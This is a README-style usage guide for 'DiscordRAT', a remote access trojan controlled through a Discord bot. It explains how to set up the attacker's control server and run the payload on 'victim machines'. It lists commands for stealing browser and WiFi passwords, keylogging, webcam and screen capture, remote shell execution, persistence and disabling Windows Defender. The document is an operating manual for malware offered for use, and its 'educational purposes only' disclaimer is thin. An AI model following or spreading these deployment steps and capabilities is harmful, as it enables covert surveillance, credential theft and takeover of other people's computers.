╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                    📡 DISCORDRAT - INSTALLATION & USAGE                      ║
║                    Advanced C2 Framework with Discord & Web                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝

┌───────────────────────────────────────────────────────────────────────────────┐
│                           SYSTEM REQUIREMENTS                                │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  🐍 Python        : 3.11 or higher                                           │
│  💻 OS            : Windows 10/11 (Primary) / Linux (Limited)                │
│  💾 RAM           : 512MB minimum                                            │
│  💿 Storage       : 100MB                                                   │
│  🌐 Internet      : Required for Discord connection                          │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          🚀 QUICK INSTALLATION                               │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  # 1. Clone or Download                                                      │
│  ──────────────────────────────────────────────────────────────────────────  │
│  git clone https://github.com/yourusername/discordrat.git                    │
│  cd discordrat                                                               │
│                                                                               │
│  # 2. Install Python Dependencies                                            │
│  ──────────────────────────────────────────────────────────────────────────  │
│  pip install -r requirements.txt                                             │
│                                                                               │
│  # 3. Install Manually (if requirements.txt missing)                         │
│  ──────────────────────────────────────────────────────────────────────────  │
│  pip install discord.py flask flask-cors flask-socketio python-socketio      │
│  pip install eventlet requests psutil Pillow mss pywin32 pynput              │
│  pip install opencv-python pycryptodome wmi pycaw comtypes                    │
│                                                                               │
│  # 4. Verify Installation                                                    │
│  ──────────────────────────────────────────────────────────────────────────  │
│  python --version                                                            │
│  pip list | findstr discord                                                  │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                    🤖 DISCORD BOT SETUP (Step-by-Step)                       │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  STEP 1: Create Application                                                  │
│  ──────────────────────────────────────────────────────────────────────────  │
│  1. Go to: https://discord.com/developers/applications                       │
│  2. Click "New Application"                                                  │
│  3. Name it: "DiscordRAT" (or anything)                                     │
│  4. Click "Create"                                                           │
│                                                                               │
│  STEP 2: Create Bot                                                          │
│  ──────────────────────────────────────────────────────────────────────────  │
│  1. Click "Bot" tab on the left                                              │
│  2. Click "Add Bot" → "Yes, do it!"                                         │
│  3. Copy the TOKEN (looks like MTIzNDU2Nzg5...)                             │
│  4. ⚠️ SAVE THIS TOKEN! You'll need it later                                │
│                                                                               │
│  STEP 3: Enable Intents                                                      │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Scroll down to "Privileged Gateway Intents" and toggle ON:                 │
│  ✅ Message Content Intent                                                   │
│  ✅ Server Members Intent                                                    │
│  ✅ Presence Intent                                                          │
│                                                                               │
│  STEP 4: Invite Bot to Server                                                │
│  ──────────────────────────────────────────────────────────────────────────  │
│  1. Go to OAuth2 → URL Generator                                             │
│  2. Scopes: ✅ bot                                                          │
│  3. Permissions: ✅ Administrator                                            │
│  4. Copy the generated URL                                                   │
│  5. Open in browser and invite to your server                                │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          🔧 CONFIGURATION                                    │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  Edit BOTH files (rat.py AND server.py):                                    │
│                                                                               │
│  # Open rat.py                                                               │
│  ──────────────────────────────────────────────────────────────────────────  │
│  notepad rat.py                                                              │
│                                                                               │
│  # Find this line:                                                           │
│  DISCORD_TOKEN = "YOUR_BOT_TOKEN_HERE"                                       │
│                                                                               │
│  # Replace with your actual token:                                           │
│  DISCORD_TOKEN = "MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.Gv7xYy.abcdefghijklmnopqrstuvwxyz"│
│                                                                               │
│  # DO THE SAME in server.py                                                  │
│  ──────────────────────────────────────────────────────────────────────────  │
│  notepad server.py                                                           │
│  DISCORD_TOKEN = "MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.Gv7xYy.abcdefghijklmnopqrstuvwxyz"│
│                                                                               │
│  ⚠️ IMPORTANT: BOTH files MUST use the SAME token!                          │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          ▶️ RUNNING THE RAT                                  │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  📡 CONTROL CENTER (Attacker Machine)                                       │
│  ──────────────────────────────────────────────────────────────────────────  │
│                                                                               │
│  # Start the server                                                          │
│  py server.py                                                                │
│                                                                               │
│  # Expected output:                                                          │
│  ✅ Bot connected as DiscordRAT#1234                                         │
│  🌐 Web dashboard: http://localhost:5000                                    │
│  📡 Waiting for clients...                                                  │
│                                                                               │
│  # Open web dashboard in browser                                             │
│  http://localhost:5000                                                       │
│                                                                               │
│                                                                               │
│  🖥️ RAT PAYLOAD (Victim Machine)                                            │
│  ──────────────────────────────────────────────────────────────────────────  │
│                                                                               │
│  # Start the RAT                                                             │
│  py rat.py                                                                   │
│                                                                               │
│  # Expected output:                                                          │
│  ✅ RAT connected as DiscordRAT#1234                                         │
│  🖥️  Hostname: PC-NAME                                                     │
│  🌐 IP: 192.168.1.100                                                       │
│  📡 Client ID: pc-name_192_168_1_100                                        │
│  📡 Created new channel: #pc-name-192-168-1-100                             │
│  ✅ Connection alert sent!                                                  │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                    🌐 WEB DASHBOARD FEATURES                                  │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  📊 DASHBOARD                                                                │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  Connected Clients: 3    Hostname: PC-NAME    Uptime: 2h 30m     │     │
│  │  🟢 pc-alexa    🟢 pc-john    🟢 server-01                        │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  💻 TERMINAL                                                                 │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  ▶ info                                                           │     │
│  │  📤 System Information: Hostname: pc-alexa, IP: 192.168.1.100... │     │
│  │  ▶ screenshot                                                     │     │
│  │  ✅ Command sent successfully                                      │     │
│  │  📸 Screenshot captured and sent!                                 │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  📁 FILE MANAGER                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  [PWD] [Up] [List] [New Folder]                          C:\        │     │
│  │  📁 Documents/     📁 Downloads/    📄 file.txt (1.2 KB)         │     │
│  │  📁 Pictures/      📁 Videos/       📄 secret.txt (0 B)          │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  📷 CAPTURE                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  [Screenshot] [Webcam] [Keylogs] [Clipboard]                      │     │
│  │  📸 Image Gallery                                                   │     │
│  │  ┌────────┐ ┌────────┐ ┌────────┐                                 │     │
│  │  │ 📷 img1 │ │ 📷 img2 │ │ 📷 img3 │  [Clear Images]              │     │
│  │  └────────┘ └────────┘ └────────┘                                 │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          🎮 DISCORD COMMANDS                                 │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  📁 FILE MANAGEMENT                                                 │     │
│  │  !pwd              Show current directory                          │     │
│  │  !ls               List files                                      │     │
│  │  !cd Documents     Change directory                                │     │
│  │  !mkdir folder     Create folder                                   │     │
│  │  !delete file.txt  Delete file                                     │     │
│  │  !download file    Download file from victim                       │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  🖥️ SYSTEM                                                         │     │
│  │  !info              Full system info                               │     │
│  │  !shell whoami      Execute shell command                         │     │
│  │  !ps                Running processes                             │     │
│  │  !kill 1234         Kill process by PID                           │     │
│  │  !ping              Check connection                              │     │
│  │  !persist           Install persistence                           │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  📷 CAPTURE                                                         │     │
│  │  !screenshot         Take screenshot                               │     │
│  │  !webcam             Take webcam photo                             │     │
│  │  !keylogs            Get keylogger logs                            │     │
│  │  !clipboard          Get clipboard contents                        │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  🔑 STEALER                                                         │     │
│  │  !passwords          Steal browser passwords                       │     │
│  │  !wifi               Get WiFi passwords                            │     │
│  │  !history            Browser history                               │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  🎮 FUN                                                            │     │
│  │  !beep               Make PC beep                                  │     │
│  │  !volume 50          Set volume (0-100)                           │     │
│  │  !openurl youtube.com Open URL                                    │     │
│  │  !speak Hello World  Make PC speak text                           │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────┐     │
│  │  🖥️ SYSTEM CONTROL                                                  │     │
│  │  !rdp               Enable RDP                                     │     │
│  │  !lock              Lock workstation                               │     │
│  │  !restart           Restart PC                                     │     │
│  │  !shutdown          Shutdown PC                                    │     │
│  │  !selfdestruct      ⚠️ Remove RAT completely                      │     │
│  └─────────────────────────────────────────────────────────────────────┘     │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          🏗️ ARCHITECTURE                                    │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────┐        │
│  │                    WEB INTERFACE (server.py)                    │        │
│  │                    http://localhost:5000                      │        │
│  │                                                                 │        │
│  │  - Shows all connected clients                                 │        │
│  │  - Send commands to clients                                    │        │
│  │  - View results                                                │        │
│  │  - Beautiful dashboard UI                                      │        │
│  └─────────────────────────────┬───────────────────────────────────┘        │
│                                 │                                             │
│                                 ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────┐        │
│  │                    DISCORD (Message Broker)                    │        │
│  │                                                                 │        │
│  │  - Clients send connection alerts here                         │        │
│  │  - Commands are relayed through here                           │        │
│  │  - Results come back through here                              │        │
│  └─────────────────────────────┬───────────────────────────────────┘        │
│                                 │                                             │
│                                 ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────┐        │
│  │                    RAT PAYLOAD (rat.py)                        │        │
│  │                                                                 │        │
│  │  - Runs on victim machines                                     │        │
│  │  - Sends connection alert to Discord                           │        │
│  │  - Listens for commands via Discord                            │        │
│  │  - Executes commands and sends results back                    │        │
│  └─────────────────────────────────────────────────────────────────┘        │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          🐛 TROUBLESHOOTING                                  │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ❌ "Invalid Discord Token!"                                                 │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Solution:                                                                   │
│  1. Reset token in Discord Developer Portal                                  │
│  2. Copy the new token                                                       │
│  3. Paste it in BOTH rat.py AND server.py                                   │
│                                                                               │
│  ❌ "No clients connected"                                                   │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Solution:                                                                   │
│  1. Check rat.py is running on victim                                       │
│  2. Check BOTH scripts use SAME token                                       │
│  3. Check bot is in the server                                               │
│  4. Check bot has proper permissions                                         │
│                                                                               │
│  ❌ "ModuleNotFoundError"                                                    │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Solution:                                                                   │
│  pip install [module_name]                                                   │
│  # OR                                                                        │
│  pip install -r requirements.txt                                             │
│                                                                               │
│  ❌ "Port 5000 already in use"                                               │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Solution:                                                                   │
│  Change port in server.py:                                                   │
│  socketio.run(app, host='0.0.0.0', port=5001)                               │
│                                                                               │
│  ❌ "Commands not working"                                                   │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Solution:                                                                   │
│  1. Make sure you're in the client's channel                                │
│  2. Check you're using the right client ID                                  │
│  3. Check the RAT is still running                                           │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          🔒 SECURITY NOTES                                   │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ⚠️ THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!                            │
│                                                                               │
│  ✅ DO use in:                                                               │
│  - Your own lab environment                                                  │
│  - Authorized penetration testing                                            │
│  - Security research                                                         │
│  - Educational purposes                                                      │
│                                                                               │
│  ❌ NEVER use on:                                                            │
│  - Systems you don't own                                                     │
│  - Without explicit written permission                                       │
│  - For malicious purposes                                                    │
│                                                                               │
│  🛡️ Best Practices:                                                         │
│  1. Use in isolated networks                                                │
│  2. Keep the bot token private                                               │
│  3. Use strong passwords for RDP                                             │
│  4. Monitor network traffic                                                  │
│  5. Clean up after testing                                                   │
│  6. Document all activities                                                  │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          📊 COMMAND QUICK REFERENCE                         │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ┌───────────────────────┬───────────────────────────────────────────────┐   │
│  │ Category              │ Commands                                       │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 📁 File               │ pwd, ls, cd, mkdir, delete, rename, copy,    │   │
│  │                       │ move, download                                │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 🖥️ System            │ info, shell, ps, kill, ping, uptime,         │   │
│  │                       │ hostname, ip, whoami, persist                 │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 📷 Capture            │ screenshot, webcam, keylogs, clipboard        │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 🔑 Stealer            │ passwords, wifi, history                      │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 🌐 Network            │ netstat, arp, nslookup, pinghost              │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 🎮 Fun                │ beep, volume, screenbrightness, openurl,     │   │
│  │                       │ wallpaper, speak                              │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 🖥️ Control            │ rdp, lock, restart, shutdown, logout,       │   │
│  │                       │ sleep, hibernate                              │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 🛡️ Defender           │ disabledefender, enabledefender,             │   │
│  │                       │ adddefenderexclusion                          │   │
│  ├───────────────────────┼───────────────────────────────────────────────┤   │
│  │ 💀 Dangerous          │ selfdestruct                                 │   │
│  └───────────────────────┴───────────────────────────────────────────────┘   │
│                                                                               │
│  Total: 47 Commands 🚀                                                        │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          📁 FILE STRUCTURE                                   │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  DiscordRAT/                                                                  │
│  ├── rat.py              # RAT Payload (Victim machine)                      │
│  ├── server.py           # Control Center (Attacker machine)                 │
│  ├── requirements.txt    # Python dependencies                               │
│  ├── README.md           # Documentation                                    │
│  ├── clients.json        # Auto-generated client database                    │
│  ├── templates/                                                              │
│  │   └── index.html      # Web Dashboard UI                                 │
│  └── static/                                                                 │
│      └── script.js       # Web Dashboard JavaScript                          │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


┌───────────────────────────────────────────────────────────────────────────────┐
│                          📝 LICENSE & DISCLAIMER                             │
├───────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  MIT License                                                                  │
│                                                                               │
│  Copyright (c) 2024 DiscordRAT                                                │
│                                                                               │
│  Permission is hereby granted, free of charge, to any person obtaining a     │
│  copy of this software and associated documentation files (the "Software"),  │
│  to deal in the Software without restriction, including without limitation  │
│  the rights to use, copy, modify, merge, publish, distribute, sublicense,   │
│  and/or sell copies of the Software, and to permit persons to whom the      │
│  Software is furnished to do so, subject to the following conditions:       │
│                                                                               │
│  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR  │
│  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,    │
│  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    │
│  THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER  │
│  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING     │
│  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER         │
│  DEALINGS IN THE SOFTWARE.                                                   │
│                                                                               │
│  ⚠️ DISCLAIMER: This tool is for educational purposes only. The author     │
│  is not responsible for any misuse of this software. Unauthorized access    │
│  to computer systems is illegal. Only use this in your own lab environment  │
│  with explicit permission.                                                   │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘


╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                    🎯 READY TO USE!                                          ║
║                                                                               ║
║  💡 Quick Start:                                                             ║
║  ──────────────────────────────────────────────────────────────────────────  ║
║  py server.py    # Start Control Center                                     ║
║  py rat.py       # Start RAT on victim                                      ║
║  http://localhost:5000  # Open Web Dashboard                                ║
║                                                                               ║
║  📚 Full documentation at:                                                   ║
║  https://github.com/yourusername/discordrat/wiki                            ║
║                                                                               ║
║  ⭐ If you find this useful, please give it a star!                         ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
